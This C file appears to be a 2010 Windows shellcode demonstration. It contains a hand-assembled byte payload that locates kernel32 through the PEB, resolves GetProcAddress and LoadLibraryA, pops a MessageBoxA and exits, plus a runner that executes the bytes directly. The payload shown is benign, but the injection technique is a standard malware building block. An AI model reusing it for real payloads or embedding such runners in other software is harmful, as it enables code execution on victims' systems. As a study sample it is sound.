/*
Title: Allwin MessageBoxA Shellcode
Date: 2010-06-11
Author: RubberDuck
Web: http://bflow.security-portal.cz
Tested on: Win 2k, Win 2003, Win XP Home SP2/SP3 CZ/ENG (32), Win Vista (32)/(64), Win 7 (32)/(64), Win 2k8 (32)
Thanks to: kernelhunter, Lodus, Vrtule, Mato, cm3l1k1, eat, st1gd3r and others
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(){
    unsigned char shellcode[]=
    "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
    "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
    "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
    "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
    "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
    "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
    "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
    "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
    "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
    "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
    "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
    "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
    "\x8E\x03\xD3\x52\x33\xFF\x57\x68\x61\x72"
    "\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F"
    "\x61\x64\x54\x53\xFF\xD2\x68\x33\x32\x01"
    "\x01\x66\x89\x7C\x24\x02\x68\x75\x73\x65"
    "\x72\x54\xFF\xD0\x68\x6F\x78\x41\x01\x8B"
    "\xDF\x88\x5C\x24\x03\x68\x61\x67\x65\x42"
    "\x68\x4D\x65\x73\x73\x54\x50\xFF\x54\x24"
    "\x2C\x57\x68\x4F\x5F\x6F\x21\x8B\xDC\x57"
    "\x53\x53\x57\xFF\xD0\x68\x65\x73\x73\x01"
    "\x8B\xDF\x88\x5C\x24\x03\x68\x50\x72\x6F"
    "\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24"
    "\x40\xFF\x54\x24\x40\x57\xFF\xD0";

    printf("Size = %d\n", strlen(shellcode));

    system("PAUSE");

    ((void (*)())shellcode)();

    return 0;
}

